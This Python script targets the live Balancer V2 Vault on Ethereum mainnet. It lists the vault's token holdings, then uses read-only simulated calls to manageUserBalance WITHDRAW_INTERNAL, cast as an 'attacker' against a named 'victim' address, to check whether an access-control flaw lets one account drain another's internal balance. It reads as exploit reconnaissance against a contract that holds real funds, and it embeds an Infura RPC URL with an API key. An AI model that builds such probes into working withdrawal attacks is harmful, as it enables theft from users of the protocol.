#!/usr/bin/env python3
"""Check Balancer V2 vault actual token balances and internal balances."""

from web3 import Web3
from Crypto.Hash import keccak
from eth_abi import encode, decode

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
w3 = Web3(Web3.HTTPProvider(RPC))

VAULT = "0xBA12222222228d8Ba445958a75a0704d566BF2C8"

def sel(sig):
    k = keccak.new(digest_bits=256)
    k.update(sig.encode())
    return k.digest()[:4]

def eth_call(addr, data_hex, from_addr='0x0000000000000000000000000000000000000001'):
    try:
        result = w3.eth.call({
            'to': Web3.to_checksum_address(addr),
            'data': data_hex,
            'from': from_addr
        })
        return result
    except Exception as e:
        return str(e)

print(f"Block: {w3.eth.block_number}")

# Check token balances in the vault
tokens = {
    'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    'DAI':  '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
    'BAL':  '0xba100000625a3754423978a60c9317c58a424e3D',
    'wstETH': '0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0',
    'rETH': '0xae78736Cd615f374D3085123A210448E74Fc6393',
    'GNO':  '0x6810e776880C02933D47DB1b9fc05908e5386b96',
    'LDO':  '0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32',
}

balanceOf_sel = sel("balanceOf(address)")

print("\n=== Token Balances in Balancer V2 Vault ===")
total_value = 0
for name, addr in tokens.items():
    data = '0x' + balanceOf_sel.hex() + bytes(12).hex() + VAULT[2:].lower()
    r = eth_call(addr, data)
    if isinstance(r, bytes) and len(r) >= 32:
        balance = int.from_bytes(r[:32], 'big')
        if name in ['USDC', 'USDT']:
            human = balance / 1e6
        elif name == 'WBTC':
            human = balance / 1e8
        else:
            human = balance / 1e18
        if balance > 0:
            print(f"  {name}: {human:,.4f}")
    else:
        print(f"  {name}: error {r}")

# Check ETH balance
eth_balance = w3.eth.get_balance(Web3.to_checksum_address(VAULT))
print(f"  ETH: {eth_balance / 1e18:,.4f}")

# Now check: can we call manageUserBalance with WITHDRAW_INTERNAL
# to drain another user's internal balance?
print("\n=== Testing WITHDRAW_INTERNAL access control ===")

# The exploit: set op.sender = msg.sender, but this should only let us
# withdraw OUR OWN internal balance. The bug was that the access check
# was insufficient to prevent draining others.

# Let's test: call manageUserBalance with op.sender = attacker,
# but try to specify a different account's balance

# First, let's find accounts with internal balances
# We'd need to know specific addresses. Let's check a few known contracts.

# Check if the vault has any internal balance for some known addresses
known_whales = [
    '0x10A19e7eE7d7F8a52822f6817de8ea18204F2e4f',  # Balancer deployer
    '0xBA12222222228d8Ba445958a75a0704d566BF2C8',  # Vault itself
    '0xce88686553686da562ce7cea497ce749da109f9f',  # Fee collector
]

weth_addr = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2'
getInternalBalance_sel = sel("getInternalBalance(address,address[])")

for whale in known_whales:
    encoded = encode(['address', 'address[]'], [whale, [weth_addr]])
    data = '0x' + getInternalBalance_sel.hex() + encoded.hex()
    r = eth_call(VAULT, data)
    if isinstance(r, bytes):
        decoded = decode(['uint256[]'], r)
        balances = decoded[0]
        if balances and balances[0] > 0:
            print(f"  {whale}: WETH internal = {balances[0] / 1e18:.6f}")
        else:
            print(f"  {whale}: no internal WETH balance")
    else:
        print(f"  {whale}: error {r}")

# Now let's check: is the WITHDRAW_INTERNAL truly exploitable?
# The key test: call manageUserBalance with:
# - op.sender = attacker_address (== msg.sender, passes auth)
# - kind = WITHDRAW_INTERNAL (1)
# - amount = some amount
# - The question: WHOSE internal balance does this withdraw from?
#   If it withdraws from op.sender's balance, then the attacker
#   can only withdraw their own balance (no exploit)
#   If it withdraws from someone else's balance, that's the bug

# Let's simulate: attacker calls manageUserBalance with their own sender
# and try to withdraw from the vault's internal balance
print("\n=== Simulating WITHDRAW_INTERNAL ===")
attacker = '0x0000000000000000000000000000000000000042'

# Try withdrawing 0 WETH with WITHDRAW_INTERNAL
ops_encoded = encode(
    ['(uint8,address,uint256,address,address)[]'],
    [[(1, weth_addr, 0, attacker, attacker)]]  # kind=1=WITHDRAW_INTERNAL
)
data = '0x' + sel("manageUserBalance((uint8,address,uint256,address,address)[])").hex() + ops_encoded.hex()
r = eth_call(VAULT, data, from_addr=attacker)
if isinstance(r, bytes):
    print(f"  WITHDRAW_INTERNAL(amount=0) from attacker: SUCCESS")
else:
    print(f"  WITHDRAW_INTERNAL(amount=0) from attacker: {r}")

# Try with amount=1
ops_encoded2 = encode(
    ['(uint8,address,uint256,address,address)[]'],
    [[(1, weth_addr, 1, attacker, attacker)]]
)
data2 = '0x' + sel("manageUserBalance((uint8,address,uint256,address,address)[])").hex() + ops_encoded2.hex()
r2 = eth_call(VAULT, data2, from_addr=attacker)
if isinstance(r2, bytes):
    print(f"  WITHDRAW_INTERNAL(amount=1) from attacker: SUCCESS (!!)")
else:
    error_msg = str(r2)
    if "BAL#" in error_msg:
        # Extract error code
        import re
        match = re.search(r'BAL#(\d+)', error_msg)
        if match:
            code = match.group(1)
            print(f"  WITHDRAW_INTERNAL(amount=1): Balancer error BAL#{code}")
        else:
            print(f"  WITHDRAW_INTERNAL(amount=1): {error_msg[:200]}")
    else:
        print(f"  WITHDRAW_INTERNAL(amount=1): {error_msg[:200]}")

# Try with a DIFFERENT sender (not matching msg.sender)
# This tests the access control: can we withdraw from someone else?
victim = '0x10A19e7eE7d7F8a52822f6817de8ea18204F2e4f'
ops_encoded3 = encode(
    ['(uint8,address,uint256,address,address)[]'],
    [[(1, weth_addr, 0, victim, attacker)]]  # sender=victim but msg.sender=attacker
)
data3 = '0x' + sel("manageUserBalance((uint8,address,uint256,address,address)[])").hex() + ops_encoded3.hex()
r3 = eth_call(VAULT, data3, from_addr=attacker)
if isinstance(r3, bytes):
    print(f"  WITHDRAW_INTERNAL with victim as sender: SUCCESS (!!! ACCESS CONTROL BYPASS !!!)")
else:
    print(f"  WITHDRAW_INTERNAL with victim as sender: REVERTED (access control working)")
    print(f"    Error: {str(r3)[:200]}")

print("\n=== Checking some pool balances ===")
# Check a known pool's token balances
# BAL/WETH 80/20 pool ID: 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014
pool_id = bytes.fromhex("5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014")
getPoolTokens_sel = sel("getPoolTokens(bytes32)")
encoded_pool = encode(['bytes32'], [pool_id])
data_pool = '0x' + getPoolTokens_sel.hex() + encoded_pool.hex()
r_pool = eth_call(VAULT, data_pool)
if isinstance(r_pool, bytes):
    decoded_pool = decode(['address[]', 'uint256[]', 'uint256'], r_pool)
    token_addrs, token_bals, last_change = decoded_pool
    print(f"BAL/WETH 80/20 Pool:")
    for i, (addr, bal) in enumerate(zip(token_addrs, token_bals)):
        print(f"  Token {addr}: {bal}")
    print(f"  Last change block: {last_change}")
else:
    print(f"Pool query error: {r_pool}")
